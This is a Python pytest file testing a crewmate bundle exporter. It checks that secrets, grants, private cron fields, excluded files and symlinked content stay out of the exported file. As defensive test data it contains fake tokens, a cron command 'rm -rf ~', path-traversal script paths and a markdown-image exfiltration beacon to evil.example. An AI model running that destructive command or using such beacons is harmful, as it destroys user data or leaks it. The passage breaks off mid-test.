"""Crewmate share Phase 2: the ``.crewmate`` writer and ``POST /api/members/{slug}/export``.

What ``docs/request-for-change/rfc-crewmate-share.md`` §6 Phase 2 requires, and the
invariant behind it: nothing private leaves (no secret value, no grant, no memory row,
no ``EXPORT_EXCLUDE`` file, no ``user:`` id), and the file passes Phase 1's reader.
"""

from __future__ import annotations

import asyncio
import io
import json
import os
import random
import zipfile
import zlib
from pathlib import Path
from typing import Any

import pytest
from aiohttp import web
from aiohttp.test_utils import TestClient, TestServer

from kiro_crew import crewmate_bundle as reader
from kiro_crew import crewmate_bundle_export as ex
from kiro_crew import member_goals
from kiro_crew import members as members_mod
from kiro_crew.config.loader import (
    KiroCrewAgentConfig,
    KiroCrewConfig,
    WorkspaceConfig,
    _invalidate_config_cache,
    config_dir,
)
from kiro_crew.config.loader_locations import workspace_dir_from_entry
from kiro_crew.crewmate_bundle import crewmate_import_params, read_crewmate_file
from kiro_crew.cron import CronJob, CronSchedule
from kiro_crew.dashboard.handlers import member_export
from kiro_crew.portability_archive import EXPORT_EXCLUDE
from kiro_crew.portability_templates import AGENT_TEMPLATE_SECRET_PLACEHOLDER

#: Credential-shaped values that must never reach the file.
TOKEN = "ghp_" + "a" * 36
SECRET = "sk-proj-" + "Ab3dE" * 10
MEMBER = "scout"

SPEC = {
    "name": "kirocrew",
    "allowedTools": ["fs_write"],
    "autoApprove": ["*"],
    "permissions": {"shell": "allow"},
    "mcpServers": {
        "gh": {
            "command": "gh-mcp",
            "env": {"GITHUB_TOKEN": TOKEN},
            "headers": {"Authorization": f"Bearer {SECRET}"},
            "oauth": {"clientId": "abc", "clientSecret": SECRET},
            "autoApprove": ["create_issue"],
        }
    },
}


def _zip(data: bytes) -> dict[str, bytes]:
    with zipfile.ZipFile(io.BytesIO(data)) as zf:
        return {i.filename: zf.read(i) for i in zf.infolist()}


def _all_bytes(entries: dict[str, bytes]) -> bytes:
    return b"\n".join(entries.values()) + b"\n" + "\n".join(entries).encode()


def _crons_root() -> Path:
    root = config_dir() / "crons"
    root.mkdir(parents=True, exist_ok=True)
    return root


def _skills_root(tmp_path: Path) -> Path:
    root = tmp_path / "ws" / "skills"
    root.mkdir(parents=True)
    return root


def _skill(root: Path, name: str, files: dict[str, str]) -> Path:
    d = root / name
    d.mkdir()
    for fname, text in files.items():
        (d / fname).write_text(text, encoding="utf-8", newline="")
    return d


def _sources(**kw: Any) -> ex.ExportSources:
    base: dict[str, Any] = {"name": "Scout", "description": "Watches release branches."}
    base.update(kw)
    return ex.ExportSources(**base)


def _build(src: ex.ExportSources, choices: ex.ExportChoices | None = None):
    plan = ex.plan_export(src, MEMBER, choices or ex.ExportChoices())
    return plan, _zip(ex.write_bundle(plan))


def _reasons(plan: ex.ExportPlan) -> set[tuple[str, str, str]]:
    return {(i.kind, i.name, i.reason) for i in plan.left_out}


# ── no secret, no grant ──


def test_mcp_secrets_in_env_headers_and_oauth_become_placeholders_and_grants_go() -> None:
    part = ex.agent_part(SPEC)
    server = part["mcpServers"]["gh"]
    assert server["env"] == {"GITHUB_TOKEN": AGENT_TEMPLATE_SECRET_PLACEHOLDER}
    assert server["headers"] == {"Authorization": AGENT_TEMPLATE_SECRET_PLACEHOLDER}
    assert server["oauth"]["clientSecret"] == AGENT_TEMPLATE_SECRET_PLACEHOLDER
    assert set(part) == {"mcpServers"} and "autoApprove" not in server
    dumped = json.dumps(part)
    assert TOKEN not in dumped and SECRET not in dumped
    assert ex.mcp_placeholder_rows(part) == [
        {
            "server": "gh",
            "placeholders": ["env.GITHUB_TOKEN", "headers.Authorization", "oauth.clientSecret"],
        }
    ]


def test_the_file_holds_no_secret_and_no_grant_and_no_mcp_entry_yet() -> None:
    """RFC §5.7: until the per-mate file lands, ``agent.json`` carries no MCP server or
    skill entry; the preview still names the servers and the keys a receiver fills."""
    plan, entries = _build(_sources(agent_spec=SPEC))
    blob = _all_bytes(entries)
    assert TOKEN.encode() not in blob and SECRET.encode() not in blob
    for grant in reader._GRANT_KEYS:
        assert grant.encode() not in blob
    assert json.loads(entries["agent.json"]) == {"mcpServers": {}, "skills": []}
    view = ex.preview(plan)
    assert view["mcp_in_file"] is False
    assert view["mcp_servers"][0]["server"] == "gh"


def test_a_credential_in_rules_description_or_a_cron_prompt_stays_home() -> None:
    plan, entries = _build(
        _sources(
            description=f"token {TOKEN}",
            rules=f"use {SECRET}",
            crons=[
                {
                    "name": "nightly",
                    "message": f"push with {TOKEN}",
                    "schedule": {"kind": "cron", "cron_expr": "0 9 * * *"},
                }
            ],
        )
    )
    assert TOKEN.encode() not in _all_bytes(entries) and SECRET.encode() not in _all_bytes(entries)
    assert {
        ("description", "", "credential"),
        ("rules", "", "credential"),
        ("cron", "nightly", "credential"),
    } <= _reasons(plan)
    assert "rules.json" not in entries and "crons.json" not in entries


def test_a_cron_carries_only_its_schedule_prompt_timezone_and_script() -> None:
    job = {
        "id": "j1",
        "name": "nightly",
        "message": "Summarise the day",
        "schedule": {"kind": "cron", "cron_expr": "0 9 * * *", "every_secs": None},
        "timezone": "Europe/Paris",
        "env": {"API_KEY": "visible-value"},
        "secret_env": {"TOKEN": "vault:x"},
        "approval_mode": "auto",
        "agent_id": MEMBER,
        "member_id": "scout-1",
        "channel": "C123",
        "last_result": "private run output",
        "created_by": "U999",
    }
    plan, entries = _build(_sources(crons=[job]))
    crons = json.loads(entries["crons.json"])
    assert crons == [
        {
            "name": "nightly",
            "cron_expr": "0 9 * * *",
            "message": "Summarise the day",
            "timezone": "Europe/Paris",
        }
    ]
    blob = _all_bytes(entries)
    for private in (
        b"visible-value",
        b"vault:x",
        b"private run output",
        b"U999",
        b"C123",
        b"scout-1",
    ):
        assert private not in blob


@pytest.mark.parametrize("field", ["timezone", "cron_expr", "every_secs", "at_ts"])
@pytest.mark.parametrize("prefix", ["", "x" * 80 + " "])
@pytest.mark.parametrize(
    "unsafe, reason", [(TOKEN, ex.REASON_CREDENTIAL), ("bad\x07", ex.REASON_CONTROL_CHARS)]
)
def test_cron_metadata_is_checked_whole_before_it_travels(
    field: str, prefix: str, unsafe: str, reason: str
) -> None:
    job: dict[str, Any] = {
        "name": "nightly",
        "message": "Summarise the day",
        "schedule": {"kind": "cron", "cron_expr": "0 9 * * *"},
        "timezone": "Europe/Paris",
    }
    if field == "timezone":
        job[field] = prefix + unsafe
    else:
        job["schedule"][field] = prefix + unsafe
    plan, entries = _build(_sources(crons=[job]))
    assert plan.left_out == [ex.LeftOut("cron", "", reason)]
    assert ex.preview(plan)["crons"] == []
    assert TOKEN not in json.dumps(ex.preview(plan))
    assert TOKEN.encode() not in _all_bytes(entries)
    assert TOKEN.encode() not in ex.write_bundle(plan)


def test_final_gate_refuses_a_credential_in_a_generated_lessons_skill_name() -> None:
    # The lessons text is checked earlier, but its slug-derived folder name was not.
    with pytest.raises(ex.ExportRefused) as err:
        ex.plan_export(_sources(), TOKEN, ex.ExportChoices(lessons="# Ordinary lessons"))
    assert err.value.code == ex.REASON_CREDENTIAL
    assert err.value.message == "a part of this crewmate holds a credential or control character"


def test_final_gate_refuses_control_characters_in_ghost_trait_keys() -> None:
    with pytest.raises(ex.ExportRefused) as err:
        ex.plan_export(
            _sources(avatar={"kind": "ghost", "traits": {"eyes\x07": "round"}}),
            MEMBER,
            ex.ExportChoices(),
        )
    assert err.value.code == ex.REASON_CONTROL_CHARS


# ── crons and their scripts ──


def test_a_schedule_the_reader_cannot_take_stays_home() -> None:
    """The reader takes a 5-field ``cron_expr`` and needs a prompt on a cron with no
    script, so anything else is listed as not portable instead of breaking the file."""
    jobs = [
        {"name": "hourly", "message": "hi", "schedule": {"kind": "every", "every_secs": 3600}},
        {"name": "once", "message": "hi", "schedule": {"kind": "at", "at_ts": 1_900_000_000}},
        {"name": "odd", "message": "hi", "schedule": {"kind": "cron", "cron_expr": "0 9 * *"}},
        {"name": "mute", "message": " ", "schedule": {"kind": "cron", "cron_expr": "0 9 * * *"}},
    ]
    plan, entries = _build(_sources(crons=jobs))
    assert "crons.json" not in entries or json.loads(entries["crons.json"]) == []
    for name in ("hourly", "once", "odd", "mute"):
        assert ("cron", name, ex.REASON_NOT_PORTABLE) in _reasons(plan)


def test_a_cron_or_skill_the_reader_would_refuse_never_reaches_the_file(tmp_path: Path) -> None:
    """A long or CRLF prompt, a 17th cron or a 33rd skill would refuse the whole file
    on import, so each is listed as left out and the rest still reads back."""
    every_day = {"kind": "cron", "cron_expr": "0 9 * * *"}
    jobs = [
        {"name": "long", "message": "x" * 4001, "schedule": every_day},
        {"name": "crlf", "message": "one\r\ntwo", "schedule": every_day},
        *({"name": f"c{i:02d}", "message": "hi", "schedule": every_day} for i in range(17)),
    ]
    root = _skills_root(tmp_path)
    for i in range(33):
        _skill(root, f"s{i:02d}", {"SKILL.md": f"# Skill {i}\n"})
    # Skills only, so the 64-entry cap is not what stops the 33rd.
    plan, _ = _build(_sources(skills_root=root), ex.ExportChoices(crons=False))
    assert ("skill", "s32", ex.REASON_BUNDLE_FULL) in _reasons(plan)
    assert len(plan.skills) == 32
    plan, entries = _build(_sources(crons=jobs))
    reasons = _reasons(plan)
    assert ("cron", "long", ex.REASON_NOT_PORTABLE) in reasons
    assert ("cron", "crlf", ex.REASON_NOT_PORTABLE) in reasons
    assert ("cron", "c16", ex.REASON_BUNDLE_FULL) in reasons
    assert len(json.loads(entries["crons.json"])) == 16
    parsed = read_crewmate_file(ex.write_bundle(plan))
    params = crewmate_import_params(parsed.bundle, parsed)
    assert len(params["crons"]) == 16


def test_a_name_or_description_the_importer_refuses_never_reaches_a_file() -> None:
    """A name over the import card's 24 characters refuses the export; a description
    over the reader's 1,000 is left out, so the rest still imports."""
    with pytest.raises(ex.ExportRefused) as err:
        ex.plan_export(_sources(name="x" * 25), MEMBER, ex.ExportChoices())
    assert err.value.code == "invalid_name"
    plan, entries = _build(_sources(description="d" * 1001))
    assert ("description", "", ex.REASON_TOO_LARGE) in _reasons(plan)
    assert json.loads(entries["crewmate.json"])["description"] == ""
    # The reader refuses a carriage return in these two; each stays home on its own.
    plan, entries = _build(_sources(description="one\r\ntwo", rules="a\r\nb"))
    assert ("description", "", ex.REASON_CONTROL_CHARS) in _reasons(plan)
    assert ("rules", "", ex.REASON_CONTROL_CHARS) in _reasons(plan)
    assert "rules.json" not in entries


@pytest.mark.parametrize(
    "names",
    [["nul.md"], ["a..b.md"], ["Notes.md", "notes.md"]],
    ids=["device", "double-dot", "case"],
)
def test_a_skill_file_name_the_reader_refuses_leaves_the_skill_home(
    tmp_path: Path, names: list[str]
) -> None:
    root = _skills_root(tmp_path)
    d = _skill(root, "triage", {"SKILL.md": "# Triage", **{n: "x" for n in names}})
    if not set(names) <= set(os.listdir(d)):
        # Windows opens nul.md as a device and folds case, so the names never land.
        pytest.skip("this filesystem cannot hold these names")
    plan, entries = _build(_sources(skills_root=root))
    assert ("skill", "triage", ex.REASON_BAD_NAME) in _reasons(plan)
    assert not any(n.startswith("skills/") for n in entries)


def test_two_skill_folders_differing_only_in_case_send_one(tmp_path: Path) -> None:
    root = _skills_root(tmp_path)
    try:
        _skill(root, "Triage", {"SKILL.md": "# A"})
        _skill(root, "triage", {"SKILL.md": "# B"})
    except FileExistsError:
        pytest.skip("this filesystem folds case")
    plan, entries = _build(_sources(skills_root=root))
    assert list(plan.skills) == ["Triage"]
    assert ("skill", "triage", ex.REASON_BAD_NAME) in _reasons(plan)
    parsed = read_crewmate_file(ex.write_bundle(plan))
    crewmate_import_params(parsed.bundle, parsed)


def test_skills_come_from_the_mates_own_kiro_skills_folder_never_the_shared_one(
    tmp_path: Path,
) -> None:
    from types import SimpleNamespace

    ws = tmp_path / "mine"
    cfg = SimpleNamespace(workspaces={"mine": WorkspaceConfig(dir=str(ws))})
    assert member_export._skills_root(cfg, SimpleNamespace(workspace="mine")) == (
        ws / ".kiro" / "skills"
    )
    # No workspace of its own: the shared default's skills are not this mate's.
    assert member_export._skills_root(cfg, SimpleNamespace(workspace="")) is None
    assert member_export._skills_root(cfg, SimpleNamespace(workspace="gone")) is None
    cfg.workspaces["default"] = WorkspaceConfig(dir=str(tmp_path / "shared"))
    assert member_export._skills_root(cfg, SimpleNamespace(workspace="default")) is None
    elsewhere = tmp_path / "elsewhere"
    elsewhere.mkdir()
    ws.mkdir()
    (ws / ".kiro").symlink_to(elsewhere, target_is_directory=True)
    assert member_export._skills_root(cfg, SimpleNamespace(workspace="mine")) is None


def test_a_skill_folder_swapped_for_a_link_mid_walk_reads_nothing_outside(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The folder is listed, then replaced by a link to private files before its
    files are read. The boundary stays the resolved folder, so nothing outside
    it is read into the plan."""
    root = _skills_root(tmp_path)
    _skill(root, "triage", {"SKILL.md": "# Triage", "notes.md": "fine"})
    outside = tmp_path / "private"
    outside.mkdir()
    (outside / "SKILL.md").write_text("# Private", encoding="utf-8")
    (outside / "notes.md").write_text("private prose", encoding="utf-8")
    real_scan = ex._scan

    def scan(directory: Path, limit: int | None = None) -> list[Any]:
        got = real_scan(directory, limit)
        if directory.name == "triage" and not directory.is_symlink():
            directory.rename(directory.with_name("triage-old"))
            try:
                directory.symlink_to(outside, target_is_directory=True)
            except OSError:
                pytest.skip("this host cannot make a directory link")
        return got

    monkeypatch.setattr(ex, "_scan", scan)
    plan, entries = _build(_sources(skills_root=root))
    assert "triage" not in plan.skills
    assert b"private prose" not in _all_bytes(entries)
    assert b"# Private" not in _all_bytes(entries)


def test_skills_not_picked_or_past_the_cap_are_never_read(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Only folders a file could carry are read into memory: picked ones, up to the
    reader's skill count."""
    root = _skills_root(tmp_path)
    for i in range(40):
        _skill(root, f"s{i:02d}", {"SKILL.md": f"# Skill {i}\n"})
    read: list[str] = []
    real_read = ex._read_skill

    def spy(directory: Path) -> Any:
        read.append(directory.name)
        return real_read(directory)

    monkeypatch.setattr(ex, "_read_skill", spy)
    ex.bundled_skills(root, frozenset({"s01", "s03"}))
    assert read == ["s01", "s03"]
    read.clear()
    found, left = ex.bundled_skills(root)
    assert len(read) == len(found) == 32
    assert sum(i.reason == ex.REASON_BUNDLE_FULL for i in left) == 8


def test_a_skill_folder_with_more_files_than_a_bundle_holds_is_never_read_whole(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    root = _skills_root(tmp_path)
    _skill(root, "huge", {"SKILL.md": "# Huge", **{f"f{i:03d}.md": "" for i in range(80)}})
    read: list[str] = []
    real_capped = ex._read_capped
    monkeypatch.setattr(
        ex, "_read_capped", lambda p, *a, **k: read.append(p.name) or real_capped(p, *a, **k)
    )
    plan, _ = _build(_sources(skills_root=root))
    assert ("skill", "huge", ex.REASON_TOO_LARGE) in _reasons(plan)
    assert read == []


def test_a_skill_file_that_vanishes_mid_read_is_left_out_not_a_500(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    root = _skills_root(tmp_path)
    _skill(root, "triage", {"SKILL.md": "# Triage"})
    real_scan = ex._scan

    class _Gone:
        def __init__(self, entry: Any) -> None:
            self._entry = entry
            self.name = entry.name

        def is_dir(self, **kw: Any) -> bool:
            return self._entry.is_dir(**kw)

        def is_symlink(self) -> bool:
            return False

        def stat(self, **_kw: Any) -> Any:
            raise FileNotFoundError(self.name)

    def scan(directory: Path, limit: int | None = None) -> list[Any]:
        got = real_scan(directory, limit)
        return [_Gone(e) for e in got] if directory.name == "triage" else got

    monkeypatch.setattr(ex, "_scan", scan)
    # On Windows the link check stats the entry too; this test is about the later stat.
    monkeypatch.setattr(ex, "_entry_is_link", lambda _entry: False)
    plan, _ = _build(_sources(skills_root=root))
    assert ("skill", "triage", ex.REASON_UNREADABLE) in _reasons(plan)


def test_a_script_cron_travels_with_its_script_and_a_missing_one_is_left_out() -> None:
    root = _crons_root()
    (root / "notes.py").write_text("def run():\n    return 'ok'\n", encoding="utf-8", newline="")
    jobs = [
        {
            "name": "notes",
            "message": "",
            "schedule": {"kind": "cron", "cron_expr": "0 9 * * *"},
            "script": f"{root}/notes.py:run",
        },
        {
            "name": "gone",
            "message": "",
            "schedule": {"kind": "cron", "cron_expr": "0 9 * * *"},
            "script": f"{root}/gone.py:run",
        },
    ]
    plan, entries = _build(_sources(crons=jobs, crons_root=root))
    assert entries["crons/notes.py"] == b"def run():\n    return 'ok'\n"
    assert json.loads(entries["crons.json"]) == [
        {
            "name": "notes",
            "cron_expr": "0 9 * * *",
            "script": "notes.py:run",
        }
    ]
    assert ("cron", "gone", ex.REASON_SCRIPT_MISSING) in _reasons(plan)
    view = ex.preview(plan)
    assert view["crons"][0]["source"].startswith("def run():")


@pytest.mark.parametrize(
    "spec",
    [
        "{root}/../outside.py:run",
        "../outside.py:run",
        "{root}/sub/inner.py:run",
        "{root}/notes.py:not-a-function",
        "{root}/notes.txt:run",
    ],
)
def test_a_script_path_outside_the_cron_folder_is_refused(spec: str, tmp_path: Path) -> None:
    root = _crons_root()
    (root / "notes.py").write_text("def run(): pass\n", encoding="utf-8", newline="")
    (root / "notes.txt").write_text("x", encoding="utf-8", newline="")
    (root / "sub").mkdir(exist_ok=True)
    (root / "sub" / "inner.py").write_text("def run(): pass\n", encoding="utf-8", newline="")
    (root.parent / "outside.py").write_text("def run(): pass\n", encoding="utf-8", newline="")
    job = {
        "name": "bad",
        "message": "",
        "schedule": {"kind": "cron", "cron_expr": "0 9 * * *"},
        "script": spec.format(root=root),
    }
    plan, entries = _build(_sources(crons=[job], crons_root=root))
    assert "crons.json" not in entries
    assert [i.reason for i in plan.left_out] in (
        [ex.REASON_SCRIPT_REFUSED],
        [ex.REASON_SCRIPT_MISSING],
    )


@pytest.mark.skipif(os.name == "nt", reason="symlinks need privileges on Windows")
def test_a_linked_script_and_a_script_holding_a_credential_stay_home() -> None:
    root = _crons_root()
    target = root.parent / "real.py"
    target.write_text("def run(): pass\n", encoding="utf-8", newline="")
    (root / "linked.py").symlink_to(target)
    (root / "leaky.py").write_text(
        f"KEY = '{TOKEN}'\ndef run(): pass\n", encoding="utf-8", newline=""
    )
    jobs = [
        {
            "name": "linked",
            "message": "",
            "schedule": {"kind": "cron", "cron_expr": "0 9 * * *"},
            "script": f"{root}/linked.py:run",
        },
        {
            "name": "leaky",
            "message": "",
            "schedule": {"kind": "cron", "cron_expr": "0 9 * * *"},
            "script": f"{root}/leaky.py:run",
        },
    ]
    plan, entries = _build(_sources(crons=jobs, crons_root=root))
    assert "crons.json" not in entries
    assert ("cron", "leaky", ex.REASON_CREDENTIAL) in _reasons(plan)
    assert ("cron", "linked", ex.REASON_SCRIPT_REFUSED) in _reasons(plan)
    assert TOKEN.encode() not in _all_bytes(entries)


def test_a_shell_command_cron_never_travels() -> None:
    job = {
        "name": "sh",
        "message": "",
        "schedule": {"kind": "cron", "cron_expr": "0 9 * * *"},
        "command": "rm -rf ~",
    }
    plan, entries = _build(_sources(crons=[job]))
    assert "crons.json" not in entries
    assert _reasons(plan) == {("cron", "sh", ex.REASON_SHELL_COMMAND)}


@pytest.mark.parametrize("prefix", ["", "x" * 80 + " "])
@pytest.mark.parametrize(
    "job",
    [
        {"command": "echo ok", "schedule": {"kind": "cron", "cron_expr": "0 9 * * *"}},
        {"schedule": {"kind": "not-portable"}},
    ],
)
def test_a_refused_cron_name_never_reaches_the_preview(prefix: str, job: dict[str, Any]) -> None:
    plan, _entries = _build(_sources(crons=[{**job, "name": prefix + TOKEN}]))
    assert TOKEN not in json.dumps(ex.preview(plan))
    assert plan.left_out == [ex.LeftOut("cron", "", ex.REASON_CREDENTIAL)]


def test_crons_off_leaves_every_cron_out_of_the_file() -> None:
    job = {"name": "n", "message": "hi", "schedule": {"kind": "cron", "cron_expr": "0 9 * * *"}}
    _plan, entries = _build(_sources(crons=[job]), ex.ExportChoices(crons=False))
    assert "crons.json" not in entries


# ── skills ──


def test_a_skill_the_sender_wrote_travels_with_every_file(tmp_path: Path) -> None:
    root = _skills_root(tmp_path)
    _skill(root, "branch-triage", {"SKILL.md": "# Triage\n", "helper.py": "print('hi')\r\n"})
    plan, entries = _build(_sources(skills_root=root))
    assert entries["skills/branch-triage/SKILL.md"] == b"# Triage\n"
    assert entries["skills/branch-triage/helper.py"] == b"print('hi')\r\n"
    assert json.loads(entries["crewmate.json"])["skills"] == [
        {"name": "branch-triage", "source": "bundled"}
    ]
    assert ex.preview(plan)["skills"][0]["files"]["helper.py"] == "print('hi')\r\n"


@pytest.mark.parametrize(
    "files, reason",
    [
        ({"SKILL.md": f"use {TOKEN}"}, ex.REASON_CREDENTIAL),
        ({"SKILL.md": "ok\x07bell"}, ex.REASON_CONTROL_CHARS),
        ({"notes.md": "no skill file"}, ex.REASON_NO_SKILL_MD),
        ({"SKILL.md": "x" * (ex.MAX_FILE_BYTES + 1)}, ex.REASON_TOO_LARGE),
        ({"SKILL.md": "ok", ".env": f"KEY={TOKEN}"}, ex.REASON_EXCLUDED),
        ({"SKILL.md": "ok", ".local_secret": "s"}, ex.REASON_EXCLUDED),
        ({"SKILL.md": "ok", "run.pid": "1"}, ex.REASON_EXCLUDED),
        ({"SKILL.md": "ok", ".hidden": "x"}, ex.REASON_BAD_NAME),
        ({"SKILL.md": "ok", f"{TOKEN}.md": "harmless"}, ex.REASON_CREDENTIAL),
    ],
)
def test_a_skill_that_fails_a_check_is_left_out_with_its_reason(
    tmp_path: Path, files: dict[str, str], reason: str
) -> None:
    root = _skills_root(tmp_path)
    _skill(root, "bad", files)
    plan, entries = _build(_sources(skills_root=root))
    assert not any(n.startswith("skills/") for n in entries)
    assert _reasons(plan) == {("skill", "bad", reason)}
    assert TOKEN.encode() not in _all_bytes(entries)


def test_an_export_exclude_name_is_never_opened(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    root = _skills_root(tmp_path)
    _skill(root, "s", {"SKILL.md": "ok", **{name: "secret" for name in EXPORT_EXCLUDE}})
    opened: list[str] = []
    import kiro_crew.hooks as hooks

    real = hooks.safe_read_file_bytes_nolink

    def spy(raw: str, *a: Any, **kw: Any):
        opened.append(os.path.basename(raw))
        return real(raw, *a, **kw)

    monkeypatch.setattr(hooks, "safe_read_file_bytes_nolink", spy)
    plan, entries = _build(_sources(skills_root=root))
    assert not set(opened) & EXPORT_EXCLUDE
    assert not any(os.path.basename(n) in EXPORT_EXCLUDE for n in entries)
    assert ("skill", "s", ex.REASON_EXCLUDED) in _reasons(plan)


def test_a_sub_folder_or_an_oversized_skill_is_left_out(tmp_path: Path) -> None:
    root = _skills_root(tmp_path)
    nested = _skill(root, "nested", {"SKILL.md": "ok"})
    (nested / "deeper").mkdir()
    big = {"SKILL.md": "ok", **{f"f{i}.md": "y" * (200 * 1024) for i in range(6)}}
    _skill(root, "big", big)
    plan, _entries = _build(_sources(skills_root=root))
    assert _reasons(plan) == {
        ("skill", "nested", ex.REASON_SUBFOLDER),
        ("skill", "big", ex.REASON_TOO_LARGE),
    }


@pytest.mark.skipif(os.name == "nt", reason="symlinks need privileges on Windows")
def test_a_linked_skill_folder_file_or_root_is_never_followed(tmp_path: Path) -> None:
    secret_dir = tmp_path / "elsewhere"
    secret_dir.mkdir()
    (secret_dir / "SKILL.md").write_text(f"stolen {TOKEN}", encoding="utf-8", newline="")
    root = _skills_root(tmp_path)
    (root / "linked-dir").symlink_to(secret_dir, target_is_directory=True)
    d = _skill(root, "linked-file", {})
    (d / "SKILL.md").symlink_to(secret_dir / "SKILL.md")
    plan, entries = _build(_sources(skills_root=root))
    assert {
        ("skill", "linked-dir", ex.REASON_LINK),
        ("skill", "linked-file", ex.REASON_LINK),
    } == _reasons(plan)
    assert TOKEN.encode() not in _all_bytes(entries)
    linked_root = tmp_path / "ws2"
    linked_root.mkdir()
    (linked_root / "skills").symlink_to(root, target_is_directory=True)
    plan, _ = _build(_sources(skills_root=linked_root / "skills"))
    assert _reasons(plan) == {("skill", "", ex.REASON_LINK)}


def test_unticked_skills_stay_home(tmp_path: Path) -> None:
    root = _skills_root(tmp_path)
    _skill(root, "a", {"SKILL.md": "a"})
    _skill(root, "b", {"SKILL.md": "b"})
    _plan, entries = _build(_sources(skills_root=root), ex.ExportChoices(skills=frozenset({"b"})))
    assert "skills/b/SKILL.md" in entries and "skills/a/SKILL.md" not in entries


def test_the_file_stays_inside_the_entry_cap(tmp_path: Path) -> None:
    root = _skills_root(tmp_path)
    for i in range(40):
        _skill(root, f"s{i:02d}", {"SKILL.md": "ok", "extra.md": "more"})
    plan, entries = _build(_sources(skills_root=root))
    assert len(entries) <= ex.MAX_ENTRIES
    assert any(i.reason == ex.REASON_BUNDLE_FULL for i in plan.left_out)
    names = {n.split("/")[1] for n in entries if n.startswith("skills/")}
    assert {s["name"] for s in json.loads(entries["crewmate.json"])["skills"]} == names


# ── lessons ──


def test_lessons_travel_only_as_the_text_left_in_the_editor(tmp_path: Path) -> None:
    root = _skills_root(tmp_path)
    _skill(root, f"{MEMBER}-lessons", {"SKILL.md": "an older one on disk"})
    text = "# Lessons\n\n- Check the release branch first.\n"
    plan, entries = _build(_sources(skills_root=root), ex.ExportChoices(lessons=text))
    assert entries[f"skills/{MEMBER}-lessons/SKILL.md"] == text.encode()
    assert b"an older one on disk" not in _all_bytes(entries)
    assert ("skill", f"{MEMBER}-lessons", ex.REASON_NAME_TAKEN) in _reasons(plan)
    assert not any(n.endswith((".db", ".sqlite")) or "memory" in n for n in entries)


def test_lessons_off_carries_no_lessons_skill() -> None:
    _plan, entries = _build(_sources(), ex.ExportChoices(lessons=None))
    assert not any(n.startswith("skills/") for n in entries)


def test_lessons_holding_a_credential_refuse_the_export() -> None:
    with pytest.raises(ex.ExportRefused) as err:
        ex.plan_export(_sources(), MEMBER, ex.ExportChoices(lessons=f"key {TOKEN}"))
    assert err.value.code == "lessons_" + ex.REASON_CREDENTIAL


#: A markdown-image beacon whose query carries an encoded payload.
EXFIL_URL = "https://evil.example/c?d=" + "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo" * 4


def test_lessons_holding_an_exfiltration_link_refuse_the_export() -> None:
    with pytest.raises(ex.ExportRefused) as err:
        ex.plan_export(_sources(), MEMBER, ex.ExportChoices(lessons=f"- See ![x]({EXFIL_URL})"))
    assert err.value.code == "lessons_exfil_url"


def test_lessons_with_an_ordinary_link_still_travel() -> None:
    text = "- Read https://docs.python.org/3/library/re.html first.\n"
    _plan, entries = _build(_sources(), ex.ExportChoices(lessons=text))
    assert entries[f"skills/{MEMBER}-lessons/SKILL.md"] == text.encode()


# ── dashboard, avatar, name ──


def test_a_user_template_is_not_in_the_file_and_the_view_says_so() -> None:
    plan, entries = _build(_sources(dashboard_custom=True))
    manifest = json.loads(entries["crewmate.json"])
    assert "dashboardTemplate" not in manifest and b"user:" not in _all_bytes(entries)
    assert ("dashboard", "", ex.REASON_CUSTOM_TEMPLATE) in _reasons(plan)
    plan, entries = _build(_sources(dashboard_builtin="builtin:release-board"))
    assert json.loads(entries["crewmate.json"])["dashboardTemplate"] == "builtin:release-board"


def test_the_dashboard_reader_turns_only_a_shipped_template_into_a_builtin_id(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    from types import SimpleNamespace

    from kiro_crew.dashboard_templates import catalog, instance

    rec = SimpleNamespace(package_slug="", template_id="board")
    monkeypatch.setattr(instance, "read", lambda _slug: rec)
    entry = SimpleNamespace(id="board", origin=catalog.BUILTIN_SOURCE)
    monkeypatch.setattr(catalog, "load_one", lambda _id: entry)
    assert member_export._dashboard("s") == ("builtin:board", False)
    entry.origin = catalog.USER_SOURCE
    assert member_export._dashboard("s") == ("", True)
    rec.package_slug = "own-page"
    assert member_export._dashboard("s") == ("", True)
    rec.package_slug, rec.template_id = "", ""
    assert member_export._dashboard("s") == ("", False)


def _chunk(tag: bytes, body: bytes) -> bytes:
    return len(body).to_bytes(4, "big") + tag + body + zlib.crc32(tag + body).to_bytes(4, "big")


def _png(*extra: bytes, pixels: bytes = b"\x00\x00") -> bytes:
    ihdr = _chunk(b"IHDR", (1).to_bytes(4, "big") * 2 + bytes([8, 0, 0, 0, 0]))
    idat = _chunk(b"IDAT", zlib.compress(pixels))
    return b"\x89PNG\r\n\x1a\n" + ihdr + b"".join(extra) + idat + _chunk(b"IEND", b"")


def test_an_uploaded_avatar_travels_and_an_oversized_one_does_not() -> None:
    png = _png()
    _plan, entries = _build(_sources(avatar={"kind": "image"}, avatar_image=png))
    assert entries["avatar.png"] == png
    # Incompressible pixels from a fixed seed, so the picture stays over the cap.
    big = _png(pixels=random.Random(7).randbytes(ex.MAX_AVATAR_BYTES + 1))
    plan, entries = _build(_sources(avatar={"kind": "image"}, avatar_image=big))
    assert "avatar.png" not in entries and ("avatar", "", ex.REASON_TOO_LARGE) in _reasons(plan)
    plan, entries = _build(_sources(avatar={"kind": "image"}, avatar_image=png[:-12]))
    assert "avatar.png" not in entries and ("avatar", "", ex.REASON_NOT_PORTABLE) in _reasons(plan)
    _plan, entries = _build(
        _sources(avatar={"kind": "ghost", "traits": {"eyes": "round", "hat": True}})
    )
    assert json.loads(entries["crewmate.json"])["avatarTraits"] == {"eyes": "round", "hat": True}


@pytest.mark.parametrize("kind", ["image", "ghost"])
def test_avatar_content_changes_the_plan_fingerprint(kind: str) -> None:
    from datetime import datetime, timezone

    now = datetime(2026, 1, 1, tzinfo=timezone.utc)
    avatars = (
        [
            _sources(avatar={"kind": "image"}, avatar_image=_png(pixels=pixels))
            for pixels in (b"\x00\x00", b"\x00\xff")
        ]
        if kind == "image"
        else [
            _sources(avatar={"kind": "ghost", "traits": {"eyes": eyes}})
            for eyes in ("round", "sleepy")
        ]
    )
    first, second = [ex.plan_export(src, MEMBER, ex.ExportChoices(), now=now) for src in avatars]
